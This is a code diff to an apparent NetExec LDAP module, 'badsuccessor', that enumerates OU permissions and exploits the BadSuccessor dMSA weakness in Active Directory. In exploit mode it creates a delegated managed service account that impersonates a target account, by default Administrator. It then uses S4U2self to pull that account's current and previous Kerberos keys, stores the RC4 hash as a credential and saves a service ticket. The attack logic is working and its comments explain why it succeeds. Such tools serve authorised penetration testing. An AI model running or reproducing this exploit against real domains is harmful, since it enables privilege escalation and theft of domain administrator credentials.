@@ -1,27 +1,29 @@
 import datetime
+import os
 import random
-import string
-from binascii import hexlify, unhexlify
+from binascii import hexlify
 
 from pyasn1.codec.der import decoder, encoder
+from pyasn1.error import PyAsn1Error
 from pyasn1.type.univ import noValue
 from pyasn1.type import tag
 
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldapasn1 import SDFlagsControl
 from impacket.ldap.ldap import LDAPSessionError
-from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
-from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, \
-    seq_set, seq_set_iter, PA_S4U_X509_USER, EncTGSRepPart, KERB_DMSA_KEY_PACKAGE, \
-    S4UUserID
+from impacket.krb5.kerberosv5 import KerberosError, sendReceive
+from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_S4U_X509_USER, EncTGSRepPart, KERB_DMSA_KEY_PACKAGE, S4UUserID
 from impacket.krb5.ccache import CCache
-from impacket.krb5.crypto import _enctype_table, _get_checksum_profile, Cksumtype
+from impacket.krb5.crypto import _enctype_table, _get_checksum_profile, Cksumtype, InvalidChecksum
 from impacket.krb5 import constants
 from impacket.krb5.constants import encodeFlags, ApplicationTagNumbers
 from impacket.krb5.types import Principal, KerberosTime, Ticket
+from impacket.uuid import bin_to_string
 
-from nxc.helpers.misc import CATEGORY
+from nxc.helpers.misc import CATEGORY, gen_random_string
 from nxc.parsers.ldap_results import parse_result_attributes
+from nxc.paths import NXC_PATH
+from nxc.protocols.ldap.kerberos import KerberosAttacks
 
 RELEVANT_OBJECT_TYPES = {
     "00000000-0000-0000-0000-000000000000": "All Objects",
@@ -31,7 +33,6 @@ RELEVANT_OBJECT_TYPES = {
 EXCLUDED_SIDS_SUFFIXES = ["-512", "-519"]  # Domain Admins, Enterprise Admins
 EXCLUDED_SIDS = ["S-1-5-32-544", "S-1-5-18"]  # Builtin Administrators, Local SYSTEM
 
-# Define all access rights
 ACCESS_RIGHTS = {
     # Generic Rights
     "GenericRead": 0x80000000,  # ADS_RIGHT_GENERIC_READ
@@ -64,7 +65,6 @@ ACCESS_RIGHTS = {
     "CreateChild": 0x00000001,  # ADS_RIGHT_DS_CREATE_CHILD
 }
 
-# Define which rights are considered relevant for potential abuse
 RELEVANT_RIGHTS = {
     "GenericAll": ACCESS_RIGHTS["GenericAll"],
     "GenericWrite": ACCESS_RIGHTS["GenericWrite"],
@@ -73,20 +73,6 @@ RELEVANT_RIGHTS = {
     "CreateChild": ACCESS_RIGHTS["CreateChild"],
     "WriteProperties": ACCESS_RIGHTS["WriteProperties"],
     "AllExtendedRights": ACCESS_RIGHTS["AllExtendedRights"]
-}
-
-FUNCTIONAL_LEVELS = {
-    "Windows 2000": 0,
-    "Windows Server 2003": 1,
-    "Windows Server 2003 R2": 2,
-    "Windows Server 2008": 3,
-    "Windows Server 2008 R2": 4,
-    "Windows Server 2012": 5,
-    "Windows Server 2012 R2": 6,
-    "Windows Server 2016": 7,
-    "Windows Server 2019": 8,
-    "Windows Server 2022": 9,
-    "Windows Server 2025": 10,
 }
 
 
@@ -101,7 +87,7 @@ class NXCModule:
     name = "badsuccessor"
     description = "Check and exploit the bad successor attack (DMSA)"
     supported_protocols = ["ldap"]
-    category = CATEGORY.ENUMERATION
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def __init__(self, context=None, module_options=None):
         self.context = context
@@ -111,6 +97,8 @@ class NXCModule:
         self.target_account = None
         self.dmsa_name = None
         self.delete = False
+        self.valid_options = True
+        self.domain_sid = None
 
     def options(self, context, module_options):
         """
@@ -120,7 +108,7 @@ class NXCModule:
         TARGET_OU       DN of the OU where the dMSA will be created (triggers exploit mode)
         TARGET_ACCOUNT  sAMAccountName of the account to impersonate via migration (default: Administrator)
         DMSA_NAME       Name for the new dMSA object (default: auto-generated dMSA-XXXXXXXX)
-        DELETE          Set to True together with DMSA_NAME and TARGET_OU to delete an existing dMSA
+        DELETE          Delete an existing dMSA instead of creating one, requires DMSA_NAME and TARGET_OU
 
         Examples:
             nxc ldap <ip> -u user -p pass -M badsuccessor
@@ -133,34 +121,24 @@ class NXCModule:
         self.target_ou = module_options.get("TARGET_OU")
         self.target_account = module_options.get("TARGET_ACCOUNT", "Administrator")
         self.dmsa_name = module_options.get("DMSA_NAME")
-        self.delete = module_options.get("DELETE", "").upper() == "TRUE"
+        self.delete = "DELETE" in module_options
 
         if self.dmsa_name:
             self.dmsa_name = self.dmsa_name.rstrip("$")
+        if self.delete and not (self.dmsa_name and self.target_ou):
+            context.log.fail("DELETE requires both DMSA_NAME and TARGET_OU")
+            self.valid_options = False
 
-    def _get_domain_sid(self):
-        r = self.connection.search(searchFilter="(objectClass=domain)", attributes=["objectSid"])
-        parsed = parse_result_attributes(r)
-        if parsed and "objectSid" in parsed[0]:
-            return parsed[0]["objectSid"]
-        return None
+    def get_domain_sid(self):
+        parsed = parse_result_attributes(self.connection.search(searchFilter="(objectClass=domain)", attributes=["objectSid"]))
+        return parsed[0]["objectSid"] if parsed and "objectSid" in parsed[0] else None
 
-    def _resolve_sid_to_name(self, sid):
-        try:
-            resp = self.connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"])
-            parsed = parse_result_attributes(resp)
-            if parsed and "sAMAccountName" in parsed[0]:
-                return parsed[0]["sAMAccountName"]
-        except Exception:
-            pass
-        return sid
+    def resolve_sid_to_name(self, sid):
+        parsed = parse_result_attributes(self.connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"]))
+        return parsed[0]["sAMAccountName"] if parsed and "sAMAccountName" in parsed[0] else sid
 
-    def _resolve_account_dn(self, sam):
-        resp = self.connection.search(
-            searchFilter=f"(&(objectClass=*)(sAMAccountName={sam}))",
-            attributes=["distinguishedName", "objectClass"],
-        )
-        parsed = parse_result_attributes(resp)
+    def resolve_account_dn(self, sam):
+        parsed = parse_result_attributes(self.connection.search(searchFilter=f"(&(objectClass=*)(sAMAccountName={sam}))", attributes=["distinguishedName", "objectClass"]))
         if not parsed:
             return None
         for entry in parsed:
@@ -171,28 +149,23 @@ class NXCModule:
                 return entry["distinguishedName"]
         return parsed[0]["distinguishedName"]
 
-    def _get_user_sid(self, username):
-        resp = self.connection.search(
-            searchFilter=f"(&(objectClass=user)(sAMAccountName={username}))",
-            attributes=["objectSid"],
-        )
-        parsed = parse_result_attributes(resp)
-        if parsed and "objectSid" in parsed[0]:
-            return parsed[0]["objectSid"]
-        return None
+    def get_user_sid(self, username):
+        parsed = parse_result_attributes(self.connection.search(searchFilter=f"(&(objectClass=user)(sAMAccountName={username}))", attributes=["objectSid"]))
+        return parsed[0]["objectSid"] if parsed and "objectSid" in parsed[0] else None
 
-    @staticmethod
-    def _is_excluded_sid(sid, domain_sid):
+    def is_excluded_sid(self, sid):
         if sid in EXCLUDED_SIDS:
             return True
-        return any(sid.startswith(domain_sid) and sid.endswith(s) for s in EXCLUDED_SIDS_SUFFIXES)
+        if not self.domain_sid:
+            return False
+        return any(sid.startswith(self.domain_sid) and sid.endswith(s) for s in EXCLUDED_SIDS_SUFFIXES)
 
     @staticmethod
-    def _build_gmsa_sd(sid_string):
+    def build_gmsa_sd(sid_string):
         sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
         sd["Revision"] = b"\x01"
         sd["Sbz1"] = b"\x00"
-        sd["Control"] = 32772
+        sd["Control"] = 32772  # SE_SELF_RELATIVE | SE_DACL_PRESENT
         sd["OwnerSid"] = ldaptypes.LDAP_SID()
         sd["OwnerSid"].fromCanonical(sid_string)
         sd["GroupSid"] = b""
@@ -204,7 +177,7 @@ class NXCModule:
         acl["Sbz2"] = 0
         acl.aces = []
 
-        for mask_value in (0x000F01FF, 0x10000000):
+        for mask_value in (0x000F01FF, 0x10000000):  # FULL_CONTROL, GenericAll
             ace = ldaptypes.ACE()
             ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
             ace["AceFlags"] = 0x00
@@ -219,134 +192,151 @@ class NXCModule:
         sd["Dacl"] = acl
         return sd.getData()
 
-    def _find_bad_successor_ous(self, entries):
-        domain_sid = self._get_domain_sid()
+    def find_bad_successor_ous(self, entries):
+        self.domain_sid = self.get_domain_sid()
         results = {}
         for entry in parse_result_attributes(entries):
             dn = entry["distinguishedName"]
             sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=entry["nTSecurityDescriptor"])
 
             for ace in sd["Dacl"]["Data"]:
-                if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
+                if ace["AceType"] not in (ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE, ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                     continue
-                mask = int(ace["Ace"]["Mask"]["Mask"])
-                if not any(mask & v for v in RELEVANT_RIGHTS.values()):
+                if not any(int(ace["Ace"]["Mask"]["Mask"]) & v for v in RELEVANT_RIGHTS.values()):
                     continue
-                ot = getattr(ace, "ObjectType", None)
-                if ot and ldaptypes.bin_to_string(ot).lower() not in RELEVANT_OBJECT_TYPES:
+                # A missing ObjectType means the right applies to every class, dMSA included
+                if ace["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and ace["Ace"]["ObjectTypeLen"] != 0 and bin_to_string(ace["Ace"]["ObjectType"]).lower() not in RELEVANT_OBJECT_TYPES:
                     continue
                 sid = ace["Ace"]["Sid"].formatCanonical()
-                if not self._is_excluded_sid(sid, domain_sid):
+                if not self.is_excluded_sid(sid):
                     results.setdefault(sid, []).append(dn)
 
-            if hasattr(sd, "OwnerSid"):
-                owner = str(sd["OwnerSid"])
-                if not self._is_excluded_sid(owner, domain_sid):
-                    results.setdefault(owner, []).append(dn)
+            owner = sd["OwnerSid"].formatCanonical()
+            if not self.is_excluded_sid(owner):
+                results.setdefault(owner, []).append(dn)
         return results
 
-    def _enumerate(self, context):
-        controls = [SDFlagsControl(criticality=True, flags=0x07)]
-        resp = self.connection.search(
-            searchFilter="(objectClass=organizationalUnit)",
-            attributes=["distinguishedName", "nTSecurityDescriptor"],
-            searchControls=controls,
-        )
-        context.log.debug(f"Found {len(resp)} OUs")
+    def enumerate_ous(self):
+        resp = self.connection.search(searchFilter="(objectClass=organizationalUnit)", attributes=["distinguishedName", "nTSecurityDescriptor"], searchControls=[SDFlagsControl(criticality=True, flags=0x07)])
+        self.context.log.debug(f"Found {len(resp)} OUs")
 
-        results = self._find_bad_successor_ous(resp)
-        if results:
-            context.log.success(f"Found {len(results)} identities with BadSuccessor privileges")
-        else:
-            context.log.highlight("No vulnerable OU found")
+        results = self.find_bad_successor_ous(resp)
+        if not results:
+            self.context.log.highlight("No vulnerable OU found")
+            return
 
+        self.context.log.success(f"Found {len(results)} identities with BadSuccessor privileges")
         for sid, ous in results.items():
-            name = self._resolve_sid_to_name(sid)
+            name = self.resolve_sid_to_name(sid)
             for ou in ous:
-                if sid == name:
-                    context.log.highlight(f"{sid}, {ou}")
-                else:
-                    context.log.highlight(f"{name} ({sid}), {ou}")
+                self.context.log.highlight(f"{sid}, {ou}" if sid == name else f"{name} ({sid}), {ou}")
 
-    def _create_dmsa(self, context, connection):
+    def create_dmsa(self):
         if not self.dmsa_name:
-            self.dmsa_name = "dMSA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+            self.dmsa_name = f"dMSA-{gen_random_string(8)}"
 
         dmsa_dn = f"CN={self.dmsa_name},{self.target_ou}"
 
-        target_dn = self._resolve_account_dn(self.target_account)
+        target_dn = self.resolve_account_dn(self.target_account)
         if not target_dn:
-            context.log.fail(f"Target account not found: {self.target_account}")
+            self.context.log.fail(f"Target account not found: {self.target_account}")
             return None
 
-        user_sid = self._get_user_sid(connection.username)
+        user_sid = self.get_user_sid(self.connection.username)
         if not user_sid:
-            context.log.fail(f"Could not resolve SID for current user: {connection.username}")
+            self.context.log.fail(f"Could not resolve SID for current user: {self.connection.username}")
             return None
 
-        sd_data = self._build_gmsa_sd(user_sid)
-        dns_hostname = f"{self.dmsa_name.lower()}.{connection.domain}"
+        sd_data = self.build_gmsa_sd(user_sid)
+        dns_hostname = f"{self.dmsa_name.lower()}.{self.connection.domain}"
 
         try:
-            connection.ldap_connection.add(
+            self.connection.ldap_connection.add(
                 dmsa_dn,
                 ["msDS-DelegatedManagedServiceAccount"],
                 {
                     "cn": self.dmsa_name,
                     "sAMAccountName": f"{self.dmsa_name}$",
                     "dNSHostName": dns_hostname,
-                    "userAccountControl": 4096,
+                    "userAccountControl": 4096,  # WORKSTATION_TRUST_ACCOUNT
                     "msDS-ManagedPasswordInterval": 30,
-                    "msDS-DelegatedMSAState": 2,
-                    "msDS-SupportedEncryptionTypes": 28,
-                    "accountExpires": 9223372036854775807,
+                    "msDS-DelegatedMSAState": 2,  # migration marked completed, this is what makes the KDC hand out the superseded account keys
+                    "msDS-SupportedEncryptionTypes": 28,  # RC4 + AES128 + AES256
+                    "accountExpires": 9223372036854775807,  # never
                     "msDS-ManagedAccountPrecededByLink": target_dn,
                     "msDS-GroupMSAMembership": sd_data,
                     "nTSecurityDescriptor": sd_data,
                 },
             )
         except LDAPSessionError as e:
-            context.log.fail(f"Failed to create dMSA '{self.dmsa_name}': {e}")
+            if "insufficientAccessRights" in str(e):
+                self.context.log.fail(f"Insufficient rights to create a dMSA in {self.target_ou}")
+            elif "entryAlreadyExists" in str(e):
+                self.context.log.fail(f"dMSA '{self.dmsa_name}$' already exists at {dmsa_dn}")
+            elif "noSuchObject" in str(e):
+                self.context.log.fail(f"OU not found: {self.target_ou}")
+            else:
+                self.context.log.fail(f"Failed to create dMSA '{self.dmsa_name}': {e}")
             return None
 
-        context.log.success(f"dMSA '{self.dmsa_name}$' created at {dmsa_dn}")
-        context.log.highlight(f"DNS Hostname: {dns_hostname}")
-        context.log.highlight("Migration state: 2 (completed)")
-        context.log.highlight(f"Target account: {target_dn}")
+        self.context.log.success(f"dMSA '{self.dmsa_name}$' created at {dmsa_dn}")
+        self.context.log.highlight(f"DNS Hostname: {dns_hostname}")
+        self.context.log.highlight("Migration state: 2 (completed)")
+        self.context.log.highlight(f"Target account: {target_dn}")
         return dmsa_dn
 
-    def _delete_dmsa(self, context):
-        if not self.dmsa_name:
-            context.log.fail("DMSA_NAME is required for deletion")
-            return
-        if not self.target_ou:
-            context.log.fail("TARGET_OU is required for deletion")
-            return
-
+    def delete_dmsa(self):
         dmsa_dn = f"CN={self.dmsa_name},{self.target_ou}"
         try:
             self.connection.ldap_connection.delete(dmsa_dn)
-            context.log.success(f"dMSA '{self.dmsa_name}$' deleted ({dmsa_dn})")
+            self.context.log.success(f"dMSA '{self.dmsa_name}$' deleted ({dmsa_dn})")
         except LDAPSessionError as e:
-            context.log.fail(f"Failed to delete dMSA '{self.dmsa_name}': {e}")
+            if "noSuchObject" in str(e):
+                self.context.log.fail(f"dMSA '{self.dmsa_name}$' not found at {dmsa_dn}")
+            elif "insufficientAccessRights" in str(e):
+                self.context.log.fail(f"Insufficient rights to delete '{self.dmsa_name}$'")
+            else:
+                self.context.log.fail(f"Failed to delete dMSA '{self.dmsa_name}': {e}")
 
-    def _do_s4u_dmsa(self, context, connection):
-        domain = connection.domain
-        kdc_host = connection.host
+    def display_keys(self, keys, label, store=False):
+        self.context.log.success(label)
+        for k in keys:
+            etype = constants.EncryptionTypes(int(k["keytype"]))
+            key_value = hexlify(bytes(k["keyvalue"])).decode()
+            self.context.log.highlight(f"{etype}: {key_value}")
+            if store and etype == constants.EncryptionTypes.rc4_hmac:
+                self.context.db.add_credential("hash", self.connection.domain, self.target_account, key_value)
 
-        user_principal = Principal(connection.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        context.log.info("Requesting TGT...")
+    def save_ccache(self, tgs, session_key):
+        output_dir = os.path.join(NXC_PATH, "modules", "badsuccessor")
+        os.makedirs(output_dir, exist_ok=True)
+        ccache_path = os.path.join(output_dir, f"{self.dmsa_name}$.ccache")
         try:
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
-                user_principal, connection.password, domain,
-                unhexlify(connection.lmhash), unhexlify(connection.nthash),
-                connection.aesKey, kdc_host,
-            )
-        except Exception as e:
-            context.log.fail(f"Failed to get TGT: {e}")
+            ccache = CCache()
+            ccache.fromTGS(tgs, session_key, session_key)
+            ccache.saveFile(ccache_path)
+        except OSError as e:
+            self.context.log.fail(f"Failed to save ccache: {e}")
+            return
+        self.context.log.success(f"Service ticket saved to {ccache_path}")
+
+    def do_s4u_dmsa(self):
+        domain = self.connection.domain
+        kdc_host = self.connection.host
+
+        self.context.log.info("Requesting TGT...")
+        try:
+            tgt_data = KerberosAttacks(self.connection).get_tgt_kerberoasting(self.connection.use_kcache)
+        except (KerberosError, OSError) as e:
+            self.context.log.fail(f"Failed to get TGT: {e}")
+            return
+        if not tgt_data:
+            self.context.log.fail(f"Failed to get TGT for {self.connection.username}")
             return
 
-        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+        cipher = tgt_data["cipher"]
+        sessionKey = tgt_data["sessionKey"]
+        decodedTGT = decoder.decode(tgt_data["KDC_REP"], asn1Spec=AS_REP())[0]
         ticket = Ticket()
         ticket.from_asn1(decodedTGT["ticket"])
 
@@ -413,11 +403,7 @@ class NXCModule:
         tgsReq["padata"][1]["padata-value"] = encoder.encode(pa_s4u)
 
         reqBody = seq_set(tgsReq, "req-body")
-        reqBody["kdc-options"] = constants.encodeFlags([
-            constants.KDCOptions.forwardable.value,
-            constants.KDCOptions.renewable.value,
-            constants.KDCOptions.canonicalize.value,
-        ])
+        reqBody["kdc-options"] = constants.encodeFlags([constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.canonicalize.value])
         serverName = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_SRV_INST.value)
         seq_set(reqBody, "sname", serverName.components_to_asn1)
         reqBody["realm"] = str(decodedTGT["crealm"])
@@ -425,80 +411,61 @@ class NXCModule:
         reqBody["nonce"] = random.getrandbits(31)
         seq_set_iter(reqBody, "etype", (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
 
-        context.log.info("Requesting S4U2self with dMSA...")
+        self.context.log.info("Requesting S4U2self with dMSA...")
         try:
             r = sendReceive(encoder.encode(tgsReq), domain, kdc_host)
-        except Exception as e:
-            context.log.fail(f"S4U2self request failed: {e}")
+        except (KerberosError, OSError) as e:
+            self.context.log.fail(f"S4U2self request failed: {e}")
             return
 
-        # Decrypt TGS-REP → extract KERB_DMSA_KEY_PACKAGE
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
         try:
             rep_cipher = _enctype_table[int(tgs["enc-part"]["etype"])]
             plain = rep_cipher.decrypt(sessionKey, 8, tgs["enc-part"]["cipher"])
             enc_part = decoder.decode(plain, asn1Spec=EncTGSRepPart())[0]
-
-            if "encrypted_pa_data" not in enc_part or not enc_part["encrypted_pa_data"]:
-                context.log.fail("No encrypted_pa_data — dMSA key package not present")
-                return
-
-            for pa in enc_part["encrypted_pa_data"]:
-                if int(pa["padata-type"]) == constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
-                    pkg = decoder.decode(pa["padata-value"], asn1Spec=KERB_DMSA_KEY_PACKAGE())[0]
-
-                    context.log.success("Current keys:")
-                    for k in pkg["current-keys"]:
-                        etype_name = constants.EncryptionTypes(int(k["keytype"]))
-                        context.log.highlight(f"{etype_name}: {hexlify(bytes(k['keyvalue'])).decode()}")
-
-                    context.log.success("Previous keys:")
-                    for k in pkg["previous-keys"]:
-                        etype_name = constants.EncryptionTypes(int(k["keytype"]))
-                        context.log.highlight(f"{etype_name}: {hexlify(bytes(k['keyvalue'])).decode()}")
-                    break
-            else:
-                context.log.fail("KERB_DMSA_KEY_PACKAGE not found in response")
-                return
-        except Exception as e:
-            context.log.fail(f"Failed to extract dMSA keys: {e}")
-            context.log.debug(f"Exception details: {e!r}")
+        except (InvalidChecksum, PyAsn1Error, KeyError) as e:
+            self.context.log.fail(f"Failed to decrypt the S4U2self reply: {e}")
             return
 
-        # Save .ccache
-        try:
-            ccache = CCache()
-            ccache.fromTGS(r, sessionKey, sessionKey)
-            filename = f"{self.dmsa_name}$.ccache"
-            ccache.saveFile(filename)
-            context.log.success(f"Service ticket saved to {filename}")
-        except Exception as e:
-            context.log.fail(f"Failed to save ccache: {e}")
+        if "encrypted_pa_data" not in enc_part or not enc_part["encrypted_pa_data"]:
+            self.context.log.fail("No encrypted_pa_data — dMSA key package not present")
+            return
+
+        for pa in enc_part["encrypted_pa_data"]:
+            if int(pa["padata-type"]) != constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
+                continue
+            pkg = decoder.decode(pa["padata-value"], asn1Spec=KERB_DMSA_KEY_PACKAGE())[0]
+            self.display_keys(pkg["current-keys"], "Current keys:", store=True)
+            self.display_keys(pkg["previous-keys"], "Previous keys:")
+            break
+        else:
+            self.context.log.fail("KERB_DMSA_KEY_PACKAGE not found in response")
+            return
+
+        self.save_ccache(r, sessionKey)
+
+    def check_dc_2025(self):
+        resp = self.connection.search(searchFilter="(&(objectCategory=computer)(primaryGroupId=516))", attributes=["operatingSystem", "dNSHostName"])
+        for dc in parse_result_attributes(resp):
+            if "2025" not in dc.get("operatingSystem", ""):
+                continue
+            out = self.connection.resolver(dc["dNSHostName"])
+            self.context.log.success(f"Found DC with Windows Server 2025: {out['host'] if out else 'Unknown IP'} ({dc['dNSHostName']})")
+            return True
+
+        self.context.log.fail("No DC with Windows Server 2025 found, attack may not be possible")
+        return False
 
     def on_login(self, context, connection):
+        self.context = context
         self.connection = connection
-
-        # Check for a domain controller with Windows Server 2025
-        resp = self.connection.search(
-            searchFilter="(&(objectCategory=computer)(primaryGroupId=516))",
-            attributes=["operatingSystem", "dNSHostName"],
-        )
-        has_2025_dc = False
-        for dc in parse_result_attributes(resp):
-            if "2025" in dc.get("operatingSystem", ""):
-                has_2025_dc = True
-                out = connection.resolver(dc["dNSHostName"])
-                dc_ip = out["host"] if out else "Unknown IP"
-                context.log.success(f"Found DC with Windows Server 2025: {dc_ip} ({dc['dNSHostName']})")
-                break
-        if not has_2025_dc:
-            context.log.fail("No DC with Windows Server 2025 found, attack may not be possible")
+        if not self.valid_options or not self.check_dc_2025():
+            return
 
         if self.delete:
-            self._delete_dmsa(context)
+            self.delete_dmsa()
         elif self.target_ou:
-            dmsa_dn = self._create_dmsa(context, connection)
-            if dmsa_dn:
-                self._do_s4u_dmsa(context, connection)
+            if self.create_dmsa():
+                self.do_s4u_dmsa()
         else:
-            self._enumerate(context)
+            self.enumerate_ous()
